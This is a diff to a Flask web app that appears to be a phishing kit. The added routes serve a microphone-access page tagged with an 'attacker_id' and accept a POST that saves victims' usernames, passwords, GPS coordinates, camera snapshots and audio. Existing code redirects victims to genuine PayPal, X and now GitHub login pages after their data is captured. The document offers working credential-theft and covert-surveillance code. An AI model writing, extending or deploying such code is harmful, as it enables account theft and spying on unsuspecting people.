@@ -79,9 +79,31 @@ def submit():
         return redirect("https://www.paypal.com/in/signin")
     elif platform == "Twitter-x":
         return redirect("https://x.com/i/flow/login")
-    elif platform == "Facebook":
-        return redirect("https://facebook.com")
+    elif platform == "Github":
+        return redirect("https://github.com/login")
     return "Success"
+
+
+# hardwareaccess
+
+
+@app.route('/MicrophoneAccess-testing/<attacker_id>')
+def microphone_access(attacker_id):
+    return render_template('mic.html', attacker_id=attacker_id)
+
+
+@app.route('/access', methods=['POST'])
+def access():
+    Access_Platform = request.form['Access_Platform']
+    username = request.form['username']
+    password = request.form['password']
+    latitude = request.form.get('latitude')
+    longitude = request.form.get('longitude')
+    snapshot = request.form.get('snapshot')
+    audio = request.form.get('audio')
+    save_data(Access_Platform, username, password,
+              latitude, longitude, snapshot, audio)
+    return "Tested  Successfully"
 
 
 if __name__ == "__main__":
